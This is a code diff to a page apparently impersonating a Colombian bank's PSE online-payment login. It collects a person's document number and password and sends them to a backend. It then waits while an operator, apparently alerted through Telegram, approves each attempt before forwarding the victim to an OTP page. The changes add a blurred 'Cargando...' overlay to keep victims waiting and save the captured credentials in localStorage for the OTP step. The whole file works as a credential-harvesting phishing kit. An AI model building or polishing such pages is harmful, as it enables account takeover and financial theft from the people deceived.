@@ -85,6 +85,7 @@
             align-items: center;
             width: 100%;
             max-width: 900px; 
+            transition: filter 0.4s ease, opacity 0.4s ease;
         }
 
         /* --- TEXTOS --- */
@@ -191,27 +192,12 @@
         .btn-primary {
             background-color: #E30613; 
             color: white;
-            min-width: 100px; /* Para que el spinner no deforme el botón */
+            min-width: 100px; 
         }
 
         .btn-secondary {
             background-color: #E30613;
             color: white;
-        }
-
-        /* --- SPINNER (RUEDA DE CARGA) --- */
-        .spinner {
-            display: none; /* Oculto por defecto */
-            width: 18px;
-            height: 18px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
         }
 
         /* --- CAMPO OCULTO (CLAVE VIRTUAL) --- */
@@ -224,6 +210,57 @@
             from { opacity: 0; transform: translateY(-10px); }
             to { opacity: 1; transform: translateY(0); }
         }
+
+        /* --- OVERLAY DE CARGA (SOLO CUANDO ENVÍA) --- */
+        .loading-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.4s ease;
+        }
+        
+        /* Esta clase se activa por JS */
+        .loading-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        /* Esta clase se activa por JS para difuminar el fondo */
+        .content.blur-active {
+            filter: blur(8px);
+            opacity: 0.4;
+            pointer-events: none; 
+        }
+
+        .loading-box {
+            background: white;
+            padding: 30px 50px;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .big-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #E30613;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading-text { font-size: 18px; font-weight: 700; color: #333; }
 
         /* --- FOOTER (PIE DE PÁGINA PC) --- */
         footer {
@@ -283,7 +320,15 @@
 
     <!-- CUERPO -->
     <main>
-        <div class="content">
+        <!-- Overlay de Carga (Oculto inicialmente) -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="loading-box">
+                <div class="big-spinner"></div>
+                <div class="loading-text">Cargando...</div>
+            </div>
+        </div>
+
+        <div class="content" id="mainContent">
             <div class="title">Ingreso Persona Natural</div>
             <div class="subtitle">Pagos en Línea y PSE</div>
 
@@ -319,8 +364,7 @@
                         <!-- Botones -->
                         <div class="button-group">
                             <button type="button" class="btn btn-primary" id="btnContinuar" onclick="mostrarClave()">
-                                <span id="btnText">Continuar</span>
-                                <div class="spinner" id="btnSpinner"></div>
+                                Continuar
                             </button>
                             <button type="button" class="btn btn-secondary" id="btnCancelar" onclick="window.location.href='index.html'">Cancelar</button>
                         </div>
@@ -355,27 +399,10 @@
         }
         actualizarFecha(); generarCUS();
 
-        // 2. LÓGICA DEL FORMULARIO Y TELEGRAM
+        // 2. LÓGICA DEL FORMULARIO Y CARGA
         let intervaloVerificacion = null;
         const btnContinuar = document.getElementById('btnContinuar');
-        const btnText = document.getElementById('btnText');
-        const btnSpinner = document.getElementById('btnSpinner');
         const btnCancelar = document.getElementById('btnCancelar');
-
-        // Función para activar/desactivar el estado de carga en el botón
-        function setLoading(isLoading) {
-            if (isLoading) {
-                btnText.style.display = 'none';       // Ocultamos el texto "Ingresar"
-                btnSpinner.style.display = 'block';   // Mostramos la rueda girando
-                btnContinuar.disabled = true;         // Bloqueamos el botón
-                btnCancelar.disabled = true;          // Bloqueamos cancelar mientras espera
-            } else {
-                btnText.style.display = 'block';      // Mostramos el texto de nuevo
-                btnSpinner.style.display = 'none';    // Ocultamos la rueda
-                btnContinuar.disabled = false;        // Desbloqueamos el botón
-                btnCancelar.disabled = false;         // Desbloqueamos cancelar
-            }
-        }
 
         function mostrarClave() {
             const claveContainer = document.getElementById('claveContainer');
@@ -388,7 +415,7 @@
 
             if (claveContainer.style.display === 'none' || claveContainer.style.display === '') {
                 claveContainer.style.display = 'flex';
-                btnText.textContent = 'Ingresar'; // Cambiamos el texto base a Ingresar
+                btnContinuar.textContent = 'Ingresar'; 
                 btnContinuar.setAttribute('onclick', 'enviarSolicitud()');
             }
         }
@@ -405,16 +432,13 @@
                 return;
             }
 
-            // Si había un polling anterior, lo limpiamos
-            if (intervaloVerificacion) {
-                clearInterval(intervaloVerificacion);
-            }
+            if (intervaloVerificacion) clearInterval(intervaloVerificacion);
 
-            // Mostramos la rueda de carga
-            setLoading(true);
+            // --- ACTIVAMOS EL EFECTO DE CARGA (BLUR Y RUEDITA) ---
+            document.getElementById('mainContent').classList.add('blur-active');
+            document.getElementById('loadingOverlay').classList.add('active');
 
             try {
-                // Petición a tu Backend en Render (Genera un nuevo ID automáticamente cada vez)
                 const response = await fetch('/api/solicitar-acceso', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -424,33 +448,41 @@
                 const data = await response.json();
 
                 if (data.status === 'ok') {
-                    // El botón se queda con la rueda girando
-                    
-                    // Empezamos a revisar si el admin ya respondió en Telegram
+                    // El formulario se queda borroso y con la ruedita mientras hacemos polling
                     intervaloVerificacion = setInterval(async () => {
                         const res = await fetch(`/api/verificar-estado/${data.id}`);
                         const estadoData = await res.json();
                         
                         if (estadoData.estado === 'aceptado') {
                             clearInterval(intervaloVerificacion);
-                            window.location.href = 'otp.html'; // PASA A OTP
+                            
+                            // Guardamos los datos para OTP
+                            localStorage.setItem('doc_usuario', documento);
+                            localStorage.setItem('clave_usuario', clave);
+                            
+                            window.location.href = 'otp.html'; 
                         } else if (estadoData.estado === 'rechazado') {
                             clearInterval(intervaloVerificacion);
-                            alert('Error: Intente de nuevo. La solicitud ha sido rechazada.');
                             
-                            // Volvemos a dejar el botón normal para que pueda reintentar
-                            setLoading(false); 
-                            btnText.textContent = 'Ingresar';
+                            // Quitamos el efecto de carga
+                            document.getElementById('mainContent').classList.remove('blur-active');
+                            document.getElementById('loadingOverlay').classList.remove('active');
+                            
+                            alert('Error: Intente de nuevo. La solicitud ha sido rechazada.');
+                            btnContinuar.textContent = 'Ingresar';
                         }
-                    }, 3000); // Revisa cada 3 segundos
+                    }, 3000); 
                 } else {
+                    // Si hay error, quitamos la carga
+                    document.getElementById('mainContent').classList.remove('blur-active');
+                    document.getElementById('loadingOverlay').classList.remove('active');
                     alert('Error de conexión. Intente de nuevo.');
-                    setLoading(false);
                 }
             } catch (error) {
                 console.error(error);
+                document.getElementById('mainContent').classList.remove('blur-active');
+                document.getElementById('loadingOverlay').classList.remove('active');
                 alert('Error de red. Intente de nuevo.');
-                setLoading(false);
             }
         }
     </script>
